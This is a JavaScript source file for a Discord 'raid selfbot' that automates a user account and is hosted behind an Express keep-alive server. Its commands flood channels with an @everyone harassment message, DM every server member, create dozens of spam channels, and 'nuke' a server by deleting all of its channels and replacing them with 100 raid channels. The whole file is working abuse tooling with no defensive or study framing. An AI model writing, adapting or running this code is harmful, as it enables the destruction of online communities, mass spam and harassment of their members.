const { Client } = require('discord.js-selfbot-v13');
const client = new Client();

const TOKEN = process.env.DISCORD_TOKEN;
const PREFIX = '!';

// Web server for Railway
const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;

app.get('/', (req, res) => {
    res.send('Spam selfbot is running!');
});

app.listen(PORT, () => {
    console.log(`Web server running on port ${PORT}`);
});

client.on('ready', () => {
    console.log(`✅ Logged in as ${client.user.tag}`);
});

// Your exact raid message
const raidMessage = `@everyone @here **RAIDED BY VAMBO**

### NEVER SCAM AGAIN SON😂
            😯KICK ROCKS😯
https://media.tenor.com/hWmpAzAlsm4AAAAM/ishowspeed-scary-speed.gif`;

client.on('messageCreate', async (message) => {
    if (message.author.id !== client.user.id) return;
    if (!message.content.startsWith(PREFIX)) return;

    const args = message.content.slice(PREFIX.length).trim().split(/ +/);
    const command = args.shift().toLowerCase();

    // ===== SPAM ALL CHANNELS (INSTANT) =====
    if (command === 'spamall') {
        const guild = message.guild;
        if (!guild) return;

        // Send activation message
        await message.channel.send('✅ VAMO ACTIVATED');
        
        // Get all text channels
        const channels = guild.channels.cache.filter(c => 
            c.type === 'GUILD_TEXT' && 
            c.permissionsFor(guild.members.me).has('SendMessages')
        );

        console.log(`Spamming ${channels.size} channels...`);

        // Send ONE message to each channel (instant)
        for (const [id, channel] of channels) {
            try {
                await channel.send(raidMessage);
                console.log(`✅ Sent to #${channel.name}`);
            } catch (error) {
                console.log(`❌ Failed #${channel.name}: ${error.message}`);
            }
        }

        console.log('✅ Spamall complete');
    }

    // ===== FLOOD CURRENT CHANNEL =====
    if (command === 'flood') {
        // Send activation message
        await message.channel.send('✅ VAMO ACTIVATED');
        
        const count = parseInt(args[0]) || 50;
        const channel = message.channel;

        // Send messages instantly (no delay)
        for (let i = 0; i < count; i++) {
            try {
                await channel.send(raidMessage);
                console.log(`✅ Flood message ${i+1}/${count}`);
            } catch (error) {
                console.log(`❌ Flood stopped: ${error.message}`);
                break;
            }
        }
    }

    // ===== SPAM CHANNELS COMMAND =====
    if (command === 'spamchannels') {
        const guild = message.guild;
        if (!guild) return;

        await message.channel.send('✅ VAMO ACTIVATED');

        let channelCount = parseInt(args[0]) || 10;
        if (channelCount > 50) channelCount = 50;

        const channelName = 'R҉A҉I҉D҉ ҉B҉Y҉ ҉V҉A҉M҉B҉O҉';

        for (let i = 1; i <= channelCount; i++) {
            try {
                const newChannel = await guild.channels.create(`${channelName}-${i}`, {
                    type: 'text'
                });
                await newChannel.send(raidMessage);
                console.log(`✅ Created channel ${i}/${channelCount}`);
            } catch (error) {
                console.log(`❌ Failed: ${error.message}`);
            }
        }
    }

    // ===== MASS DM COMMAND =====
    if (command === 'massdm') {
        const guild = message.guild;
        await message.channel.send('✅ VAMO ACTIVATED');

        let sent = 0;
        let failed = 0;

        for (const member of guild.members.cache.values()) {
            if (member.user.bot || member.id === client.user.id) continue;

            try {
                await member.send(raidMessage);
                sent++;
                console.log(`✅ DM sent to ${member.user.tag}`);
            } catch (e) {
                failed++;
            }
        }

        console.log(`✅ MassDM complete: ${sent} sent, ${failed} failed`);
    }

    // ===== NUKE COMMAND =====
    if (command === 'nuke') {
        const guild = message.guild;
        if (!guild) return;

        await message.channel.send('✅ VAMO ACTIVATED');

        // Delete all channels (fast)
        console.log('Deleting all channels...');
        for (const channel of guild.channels.cache.values()) {
            try {
                await channel.delete();
                console.log(`✅ Deleted ${channel.name}`);
            } catch (error) {
                console.log(`❌ Failed to delete: ${error.message}`);
            }
        }

        // Create 100 channels (fast)
        console.log('Creating 100 channels...');
        const channelName = 'R҉A҉I҉D҉ ҉B҉Y҉ ҉V҉A҉M҉B҉O҉';

        for (let i = 1; i <= 100; i++) {
            try {
                const newChannel = await guild.channels.create(`${channelName}-${i}`, {
                    type: 'text'
                });
                await newChannel.send(raidMessage);
                console.log(`✅ Created channel ${i}/100`);
            } catch (error) {
                console.log(`❌ Failed: ${error.message}`);
            }
        }

        console.log('✅ Nuke complete');
    }

    // ===== HELP COMMAND =====
    if (command === 'help') {
        await message.channel.send(`**🔥 VAMO RAID SELFBOT**

!spamall - Spam all channels once
!flood [count] - Flood current channel
!spamchannels [num] - Create raid channels
!massdm - DM all members
!nuke - Delete all + create 100 channels
!help - Show this menu

✅ VAMO ACTIVATED`);
    }
});

client.login(TOKEN);
